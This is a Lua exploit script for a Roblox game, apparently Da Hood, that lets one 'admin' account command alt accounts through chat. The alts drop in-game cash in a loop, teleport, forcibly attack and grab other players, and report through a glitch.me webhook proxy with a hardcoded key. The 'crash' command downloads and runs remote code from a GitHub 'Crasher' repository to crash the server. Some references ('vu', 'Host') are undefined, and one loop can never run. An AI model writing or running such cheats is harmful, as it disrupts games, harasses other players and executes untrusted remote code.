local admin = getgenv().admin

local bringer = getgenv().bringer

local prefix = getgenv().prefix
local crasher = getgenv().crasher

local adverbmsg = getgenv().adverbmsg

local alts = getgenv().alts

local fps = getgenv().fps

local webhook = getgenv().webhook


local adminpositions = {{-870,-38,-550},{-870,-38,-570},{-870,-38,-590},{-870,-38,-610},{-900,-38,-550},{-900,-38,-570},{-900,-38,-590},{-900,-38,-610}}

if not game:IsLoaded() then
    game.Loaded:Wait();
end

game.StarterGui:SetCore("SendNotification", {
        Title = "DDS";
        Text = "DDS has loaded!";
        Duration = 10;
    })

local adverb = false

local dropping = false
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local Plr = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService");




local players, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");

local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");

local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

if table.find(alts, player.name) then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("[DDS] Loaded","All")
local Module = player.PlayerScripts:FindFirstChild("PlayerModule") or player.PlayerScripts:WaitForChild("PlayerModule", 0.1)
local PlayerModule = require(Module)
local Controls = PlayerModule:GetControls()
Controls:Disable()
game:GetService("RunService"):Set3dRenderingEnabled(false)
setfpscap(fps)
end
print("Loaded DDS")
local withlimit = false
local CmdSettings = {}
local cashdropped = 0
local stopcash = 0


function SendMessage(Webhook, Message, Botname)
   local Name;
   local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
   local API = "http://buritoman69.glitch.me/webhook";
   local Body = {
       ['Key'] = tostring("applesaregood"),
       ['Message'] = tostring(Message),
       ['Name'] = Name,
       ['Webhook'] = Webhook    
   }
   Body = HttpService:JSONEncode(Body);
   local Data = game:GetService("HttpService"):PostAsync(API, Body, false, "application/json")
   return Data or nil;
end

function BringPlr(Target,POS)
	if Target.Character and Target.Character:FindFirstChild("Humanoid") then
		CmdSettings["Aura"] = nil

		local TargetPlr = Target

		local c = game.Players.LocalPlayer.Character
		local Root = c.HumanoidRootPart
		local PrevCF = Root.CFrame
		local TargetChar = TargetPlr.Character
		if TargetPlr and TargetPlr.Character and TargetPlr.Character:FindFirstChild("Humanoid") and not ( not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == true ) then
			CmdSettings["IsLocking"] = true

			c.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)

			Root.CFrame = CFrame.new(TargetChar.HumanoidRootPart.Position)*CFrame.new(0,0,1)

			repeat wait()
				Root.CFrame = CFrame.new(TargetChar.HumanoidRootPart.Position)*CFrame.new(0,0,1)
				if not c:FindFirstChild("Combat") then
					c.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Combat)     
				end
				c.Combat:Activate()
			until not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == true
			Root.CFrame = CFrame.new(TargetChar.LowerTorso.Position)*CFrame.new(0,3,0)
			if c.BodyEffects.Grabbed.Value ~= nil then

			else
				if not (not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == false ) then
					local args = {
						[1] = "Grabbing",
						[2] = false
					}

					game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
				end

			end
			repeat wait(0.35)
				if not (not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == false ) then
					Root.CFrame = CFrame.new(TargetChar.LowerTorso.Position)*CFrame.new(0,3,0)
					if c.BodyEffects.Grabbed.Value ~= nil then

					else
						if not (not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or TargetChar.BodyEffects["K.O"].Value == false)  then
							local args = {
								[1] = "Grabbing",
								[2] = false
							}
							game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
						end
					end
				end
			until not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == false 
			if POS == nil then
				Root.CFrame = Host.Character.HumanoidRootPart.CFrame
			else
				Root.CFrame = POS
			end
			CmdSettings["IsLocking"] = nil
			wait(1.5)
			local args = {
				[1] = "Grabbing",
				[2] = false
			}

			game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
		end
	end
end

local function onChatted(p,msg)
    local Args = string.split(msg," ")
    local adminPlayer = Players:FindFirstChild(admin)
    local premium = adminPlayer:GetRankInGroup(16402091) >= 2
    if premium == false then
    print("You have not bought Premium!")
    return 
    end
    
    
    if player.name==admin then
         if msg:match(prefix.."tpto") then
            local targetPlayer = Players:FindFirstChild(string.split(msg," ")[2])
            Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        end
     return
    end
     
    if p.name==admin then

        if msg == prefix.."drop" then
            withlimit = false
            dropping = true
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Start","All")
        end
        if msg:match(prefix.."fps") then
           setfpscap(tonumber(string.split(msg," ")[2]))
           game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("FPS set to "..string.split(msg," ")[2],"All")
        end
        if msg:match(prefix.."cdrop") then
            stopcash = string.gsub(string.split(msg," ")[2], "mil", "000000")
            stopcash = string.gsub(stopcash, "k", "000")
            stopcash = tonumber(stopcash)
            withlimit = true
            dropping = true
            print("Started dropping "..stopcash)
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Start","All")
        end
        if msg == prefix.."dance" then
            game:GetService("Players"):Chat("/e dance2")
        end
        if msg == prefix.."advert" then
            adverb = not adverb
            print(adverb)
        end
        if msg == prefix.."stop" then
            dropping = false
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("End","All")
            cashdropped = 0
            print("Stopped")
        end
         if msg == prefix.."dropped" then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cashdropped.."$","All")
        end
         if msg == prefix.."showscreen" then
            game:GetService("RunService"):Set3dRenderingEnabled(true)
        end
        if msg == prefix.."crash" then
            if player.name == crasher then
                loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
            end
        end
        if msg:match(prefix.."wallet") then
            print(string.split(msg," ")[2])
            if string.split(msg," ")[2] == "show" then
                    if Plr.Backpack:FindFirstChild("Wallet") and Plr.Character:FindFirstChild("Wallet") == nil then
                        local tool = Plr.Backpack:FindFirstChild("Wallet")
                        Plr.Character.Humanoid:EquipTool(tool)
                    end
            end
            if string.split(msg," ")[2] == "hide" then
                    if Plr.Backpack:FindFirstChild("Combat") and Plr.Character:FindFirstChild("Combat") == nil then
                        local tool = Plr.Backpack:FindFirstChild("Combat")
                        Plr.Character.Humanoid:EquipTool(tool)
                    end
            end
        end
        if msg == prefix.."airlock" then
           game.Players.LocalPlayer.Character.Head.Anchored = false
           local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
           humanoid.Jump = true
           wait(0.3)
           game.Players.LocalPlayer.Character.Head.Anchored = true
        end
        if msg == prefix.."unlock" then
           game.Players.LocalPlayer.Character.Head.Anchored = false
        end
        if msg == prefix.."lock" then
           game.Players.LocalPlayer.Character.Head.Anchored = true
        end
        if msg == prefix.."host" then
            print("Moving to admin.")
            local targetPlayer = Players:FindFirstChild(admin)
            Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
            player.Character.HumanoidRootPart.Rotation = Vector3.new(0,0,0)
        end
         if Args[1] == prefix.."bring" then
            if player.name == bringer then
	    print("ok"..Args[2])
            local targetHumanoid = Players:FindFirstChild(string.split(msg," ")[2])	
	    print(targetHumanoid)
            BringPlr(targetHumanoid,nil)
	    end
        end
        if msg:match(prefix.."setup") then
            for i, v in ipairs(alts) do
                if v == player.name then
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(adminpositions[i][1],adminpositions[i][2],adminpositions[i][3])
                    player.Character.HumanoidRootPart.Rotation = Vector3.new(0,0,0)
                end
            end
        end

end   
end

onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
local speaker, message = players[messageData.FromSpeaker], messageData.Message
    onChatted(speaker,message)
end);

while wait() do
    if dropping == true then
    if withlimit == true then
        if stopcash > cashdropped then
            cashdropped = cashdropped + 7000
            game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
            wait(15)
        else
            dropping = false
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("End","All")
            SendMessage(webhook, "Done dropping.", "DDS-Bot")
            cashdropped = 0
        end
    end
    if withlimit == false then
        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
        wait(15)
end
end
end


    Players.PlayerAdded:Connect(function(player)
        game.StarterGui:SetCore("SendNotification", {
            Title = "Someone joined!",
            Text = player.name .. " joined the game.",
            Duration = 5
        })
    end)
    game:GetService("Players").LocalPlayer.Idled:connect(function()
        vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        wait(1)
        vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end)


while adverb == true do
    print("Adverb enabled")
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(adverbmsg,"All")
    wait(9.5)
end


--

